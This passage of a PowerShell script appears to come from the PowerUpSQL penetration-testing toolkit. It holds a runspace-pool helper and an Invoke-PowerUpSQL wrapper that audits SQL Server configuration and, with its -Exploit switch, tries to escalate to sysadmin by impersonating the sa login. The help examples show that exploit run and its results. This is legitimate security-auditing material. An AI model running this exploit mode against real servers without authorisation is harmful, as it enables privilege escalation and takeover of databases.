                $UsingVariableData = $Null
                

                # This code enables $Using support through the AST.
                # This is entirely from  Boe Prox, and his https://github.com/proxb/PoshRSJob module; all credit to Boe!
                
                if($PSVersionTable.PSVersion.Major -gt 2)
                {
                    #Extract using references
                    $UsingVariables = $ScriptBlock.ast.FindAll({$args[0] -is [System.Management.Automation.Language.UsingExpressionAst]},$True)    

                    If ($UsingVariables)
                    {
                        $List = New-Object 'System.Collections.Generic.List`1[System.Management.Automation.Language.VariableExpressionAst]'
                        ForEach ($Ast in $UsingVariables)
                        {
                            [void]$list.Add($Ast.SubExpression)
                        }

                        $UsingVar = $UsingVariables | Group SubExpression | ForEach {$_.Group | Select -First 1}
        
                        #Extract the name, value, and create replacements for each
                        $UsingVariableData = ForEach ($Var in $UsingVar) {
                            Try
                            {
                                $Value = Get-Variable -Name $Var.SubExpression.VariablePath.UserPath -ErrorAction Stop
                                [pscustomobject]@{
                                    Name = $Var.SubExpression.Extent.Text
                                    Value = $Value.Value
                                    NewName = ('$__using_{0}' -f $Var.SubExpression.VariablePath.UserPath)
                                    NewVarName = ('__using_{0}' -f $Var.SubExpression.VariablePath.UserPath)
                                }
                            }
                            Catch
                            {
                                Write-Error "$($Var.SubExpression.Extent.Text) is not a valid Using: variable!"
                            }
                        }
                        $ParamsToAdd += $UsingVariableData | Select -ExpandProperty NewName -Unique

                        $NewParams = $UsingVariableData.NewName -join ', '
                        $Tuple = [Tuple]::Create($list, $NewParams)
                        $bindingFlags = [Reflection.BindingFlags]"Default,NonPublic,Instance"
                        $GetWithInputHandlingForInvokeCommandImpl = ($ScriptBlock.ast.gettype().GetMethod('GetWithInputHandlingForInvokeCommandImpl',$bindingFlags))
        
                        $StringScriptBlock = $GetWithInputHandlingForInvokeCommandImpl.Invoke($ScriptBlock.ast,@($Tuple))

                        $ScriptBlock = [scriptblock]::Create($StringScriptBlock)

                        #Write-Verbose $StringScriptBlock
                    }
                }
                
                $ScriptBlock = $ExecutionContext.InvokeCommand.NewScriptBlock("param($($ParamsToAdd -Join ", "))`r`n" + $Scriptblock.ToString())
            }
            else
            {
                Throw "Must provide ScriptBlock or ScriptFile"; Break
            }

            Write-Debug "`$ScriptBlock: $($ScriptBlock | Out-String)"
            Write-Verbose "Creating runspace pool and session states"


            #If specified, add variables and modules/snapins to session state
            $sessionstate = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
            if ($ImportVariables)
            {
                if($UserVariables.count -gt 0)
                {
                    foreach($Variable in $UserVariables)
                    {
                        $sessionstate.Variables.Add( (New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Variable.Name, $Variable.Value, $null) )
                    }
                }
            }
            if ($ImportModules)
            {
                if($UserModules.count -gt 0)
                {
                    foreach($ModulePath in $UserModules)
                    {
                        $sessionstate.ImportPSModule($ModulePath)
                    }
                }
                if($UserSnapins.count -gt 0)
                {
                    foreach($PSSnapin in $UserSnapins)
                    {
                        [void]$sessionstate.ImportPSSnapIn($PSSnapin, [ref]$null)
                    }
                }
            }

            # --------------------------------------------------
            #region - Import Session Functions
            # --------------------------------------------------
            # Import functions from the current session into the RunspacePool sessionstate

            if($ImportSessionFunctions){

                # Import all session functions into the runspace session state from the current one
                Get-ChildItem Function:\ | Where-Object {$_.name -notlike "*:*"} |  select name -ExpandProperty name |
                ForEach-Object {       

                    # Get the function code
                    $Definition = Get-Content "function:\$_" -ErrorAction Stop

                    # Create a sessionstate function with the same name and code
                    $SessionStateFunction = New-Object System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList "$_", $Definition

                    # Add the function to the session state
                    $sessionstate.Commands.Add($SessionStateFunction)
                }
            }
            #endregion

            #Create runspace pool
            $runspacepool = [runspacefactory]::CreateRunspacePool(1, $Throttle, $sessionstate, $Host)
            $runspacepool.Open() 

            #Write-Verbose "Creating empty collection to hold runspace jobs"
            $Script:runspaces = New-Object System.Collections.ArrayList        
        
            #If inputObject is bound get a total count and set bound to true
            $bound = $PSBoundParameters.keys -contains "InputObject"
            if(-not $bound)
            {
                [System.Collections.ArrayList]$allObjects = @()
            }

            #Set up log file if specified
            if( $LogFile ){
                New-Item -ItemType file -path $logFile -force | Out-Null
                ("" | Select Date, Action, Runtime, Status, Details | ConvertTo-Csv -NoTypeInformation -Delimiter ";")[0] | Out-File $LogFile
            }

            #write initial log entry
            $log = "" | Select Date, Action, Runtime, Status, Details
                $log.Date = Get-Date
                $log.Action = "Batch processing started"
                $log.Runtime = $null
                $log.Status = "Started"
                $log.Details = $null
                if($logFile) {
                    ($log | convertto-csv -Delimiter ";" -NoTypeInformation)[1] | Out-File $LogFile -Append
                }

			$timedOutTasks = $false

        #endregion INIT
    }

    Process {

        #add piped objects to all objects or set all objects to bound input object parameter
        if($bound)
        {
            $allObjects = $InputObject
        }
        Else
        {
            [void]$allObjects.add( $InputObject )
        }
    }

    End {
        
        #Use Try/Finally to catch Ctrl+C and clean up.
        Try
        {
            #counts for progress
            $totalCount = $allObjects.count
            $script:completedCount = 0
            $startedCount = 0

            foreach($object in $allObjects){
        
                #region add scripts to runspace pool
                    
                    #Create the powershell instance, set verbose if needed, supply the scriptblock and parameters
                    $powershell = [powershell]::Create()
                    
                    if ($VerbosePreference -eq 'Continue')
                    {
                        [void]$PowerShell.AddScript({$VerbosePreference = 'Continue'})
                    }

                    [void]$PowerShell.AddScript($ScriptBlock).AddArgument($object)

                    if ($parameter)
                    {
                        [void]$PowerShell.AddArgument($parameter)
                    }

                    # $Using support from Boe Prox
                    if ($UsingVariableData)
                    {
                        Foreach($UsingVariable in $UsingVariableData) {
                            #Write-Verbose "Adding $($UsingVariable.Name) with value: $($UsingVariable.Value)"
                            [void]$PowerShell.AddArgument($UsingVariable.Value)
                        }
                    }

                    #Add the runspace into the powershell instance
                    $powershell.RunspacePool = $runspacepool
    
                    #Create a temporary collection for each runspace
                    $temp = "" | Select-Object PowerShell, StartTime, object, Runspace
                    $temp.PowerShell = $powershell
                    $temp.StartTime = Get-Date
                    $temp.object = $object
    
                    #Save the handle output when calling BeginInvoke() that will be used later to end the runspace
                    $temp.Runspace = $powershell.BeginInvoke()
                    $startedCount++

                    #Add the temp tracking info to $runspaces collection
                    #Write-Verbose ( "Adding {0} to collection at {1}" -f $temp.object, $temp.starttime.tostring() )
                    $runspaces.Add($temp) | Out-Null
            
                    #loop through existing runspaces one time
                    Get-RunspaceData

                    #If we have more running than max queue (used to control timeout accuracy)
                    #Script scope resolves odd PowerShell 2 issue
                    $firstRun = $true
                    while ($runspaces.count -ge $Script:MaxQueue) {

                        #give verbose output
                        if($firstRun){
                            #Write-Verbose "$($runspaces.count) items running - exceeded $Script:MaxQueue limit."
                        }
                        $firstRun = $false
                    
                        #run get-runspace data and sleep for a short while
                        Get-RunspaceData
                        Start-Sleep -Milliseconds $sleepTimer
                    
                    }

                #endregion add scripts to runspace pool
            }
                     
            #Write-Verbose ( "Finish processing the remaining runspace jobs: {0}" -f ( @($runspaces | Where {$_.Runspace -ne $Null}).Count) )
            Get-RunspaceData -wait

            if (-not $quiet) {
			    Write-Progress -Activity "Running Query" -Status "Starting threads" -Completed
		    }
        }
        Finally
        {
            #Close the runspace pool, unless we specified no close on timeout and something timed out
            if ( ($timedOutTasks -eq $false) -or ( ($timedOutTasks -eq $true) -and ($noCloseOnTimeout -eq $false) ) ) {
	            Write-Verbose "Closing the runspace pool"
			    $runspacepool.close()
            }

            #collect garbage
            [gc]::Collect()
        }       
    }
}



#endregion

#########################################################################
#
#region          Invoke-PowerUpSQL WRAPPER FUNCTION
#
#########################################################################

# ----------------------------------
# Invoke-PowerUpSQL
# ----------------------------------
# Author: Scott Sutherland
Function Invoke-PowerUpSQL {
<#
    .SYNOPSIS
        Audit for high impact weak configurations by running all privilege escalation checks.
        Note:  Use the Exploit flag to attempt to obtain sysadmin privileges.
    .PARAMETER Username
        SQL Server or domain account to authenticate with.   
    .PARAMETER Password
        SQL Server or domain account password to authenticate with. 
    .PARAMETER Credential
        SQL Server credential. 
    .PARAMETER Instance
        SQL Server instance to connection to. 
    .PARAMETER NoOutput
        Don't output anything.
    .PARAMETER Exploit
        Exploit vulnerable issues.
    .EXAMPLE
        PS C:\> Invoke-PowerUpSQL -Instance SQLServer1\STANDARDDEV2014 -user evil -Password Password123!

        ComputerName  : SQLServer1
        Instance      : SQLServer1\STANDARDDEV2014
        Vulnerability : PERMISSION - IMPERSONATE LOGIN
        Description   : The current SQL Server login can impersonate other logins.  This may allow an authenticated login to gain additional privileges.
        Remediation   : Consider using an alterative to impersonation such as signed stored procedures. Impersonation is enabled using a command like: GRANT IMPERSONATE ON 
                        Login::sa to [user]. It can be removed using a command like: REVOKE IMPERSONATE ON Login::sa to [user]
        Severity      : High
        IsVulnerable  : Yes
        IsExploitable : Yes
        Exploited     : No
        ExploitCmd    : Invoke-SQLEscalate-ImpersonateLogin -Instance SQLServer1\STANDARDDEV2014 -Exploit
        Details       : evil can impersonate the sa SYSADMIN login. This test was ran with the evil login.
        Reference     : https://msdn.microsoft.com/en-us/library/ms181362.aspx
        Author        : Scott Sutherland (@_nullbind), NetSPI 2016

        [TRUNCATED]
    .EXAMPLE
        PS C:\> Invoke-PowerUpSQL -Instance SQLServer1\STANDARDDEV2014 -user evil -Password Password123! -Exploit
        ComputerName  : SQLServer1
        Instance      : SQLServer1\STANDARDDEV2014
        Vulnerability : PERMISSION - IMPERSONATE LOGIN
        Description   : The current SQL Server login can impersonate other logins.  This may allow an authenticated login to gain additional privileges.
        Remediation   : Consider using an alterative to impersonation such as signed stored procedures. Impersonation is enabled using a command like: GRANT IMPERSONATE ON 
                        Login::sa to [user]. It can be removed using a command like: REVOKE IMPERSONATE ON Login::sa to [user]
        Severity      : High
        IsVulnerable  : Yes
        IsExploitable : Yes
        Exploited     : Yes
        ExploitCmd    : Invoke-SQLEscalate-ImpersonateLogin -Instance SQLServer1\STANDARDDEV2014 -Exploit
        Details       : evil can impersonate the sa SYSADMIN login. This test was ran with the evil login.
        Reference     : https://msdn.microsoft.com/en-us/library/ms181362.aspx
        Author        : Scott Sutherland (@_nullbind), NetSPI 2016

        [TRUNCATED]
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account to authenticate with.")]
        [string]$Username,

        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account password to authenticate with.")]
        [string]$Password,

        [Parameter(Mandatory=$false,
        HelpMessage="Windows credentials.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server instance to connection to.")]
        [string]$Instance,       

        [Parameter(Mandatory=$false,
        HelpMessage="Don't output anything.")]
        [switch]$NoOutput,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Exploit vulnerable issues.")]
        [switch]$Exploit
    )

    Begin
    {
       # Table for output
        $TblData = New-Object System.Data.DataTable 
        $TblData.Columns.Add("ComputerName") | Out-Null
        $TblData.Columns.Add("Instance") | Out-Null
        $TblData.Columns.Add("Vulnerability") | Out-Null
        $TblData.Columns.Add("Description") | Out-Null
        $TblData.Columns.Add("Remediation") | Out-Null
        $TblData.Columns.Add("Severity") | Out-Null
        $TblData.Columns.Add("IsVulnerable") | Out-Null
        $TblData.Columns.Add("IsExploitable") | Out-Null
        $TblData.Columns.Add("Exploited") | Out-Null
        $TblData.Columns.Add("ExploitCmd") | Out-Null
        $TblData.Columns.Add("Details") | Out-Null    
        $TblData.Columns.Add("Reference") | Out-Null   
        $TblData.Columns.Add("Author") | Out-Null       
        
        # Table for escalation functions
        $TblVulnFunc = New-Object System.Data.DataTable 
        $TblVulnFunc.Columns.Add("FunctionName") | Out-Null
        $TblVulnFunc.Columns.Add("Type") | Out-Null
        $TblVulnFunc.Clear()    

        Write-Verbose "LOADING VULNERABILITY CHECKS."
        
        # Load list of vulnerability check functions - Server
        $TblVulnFunc.Rows.Add("Invoke-SQLEscalate-ImpersonateLogin","Server") | Out-Null
        
        # Load list of vulnerability check functions - Database
        $TblVulnFunc.Rows.Add("Invoke-SQLEscalate-SampleDataByColumn","Database") | Out-Null

        # Load list of vulnerability check functions - Misc
        # Pending

        Write-Verbose "RUNNING VULNERABILITY CHECKS."
    }

    Process
    {              
        # Test connection to server
        $TestConnection =  Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object {$_.Status -eq "Accessible"}
        if(-not $TestConnection){
            Return
        }

        # Default connection to local default instance
        if(-not $Instance){
            $Instance = $env:COMPUTERNAME
        }

        # Status user
        Write-Verbose "$Instance : RUNNING VULNERABILITY CHECKS..."        

        # Iterate through each function
        $TblVulnFunc | 
        ForEach-Object {                            

                # Get function name
                $FunctionName = $_.FunctionName

                # Run function
                if($Exploit){
                    $TblTemp = Invoke-Expression "$FunctionName -Instance '$Instance' -Username '$Username' -Password '$Password' -Exploit"
                }else{
                    $TblTemp = Invoke-Expression "$FunctionName -Instance '$Instance' -Username '$Username' -Password '$Password'"
                }

                # Append function output to results table
                $TblData = $TblData + $TblTemp
        }

        # Status user
        Write-Verbose "$Instance : COMPLETED VULNERABILITY CHECK."
    }
        
    End
    {
        # Status user
        Write-Verbose "COMPLETED ALL VULNERABILITY CHECKS."

        # Return full results table
        if ( -not $NoOutput){            
            Return $TblData
        }   
    }
}
#endregion
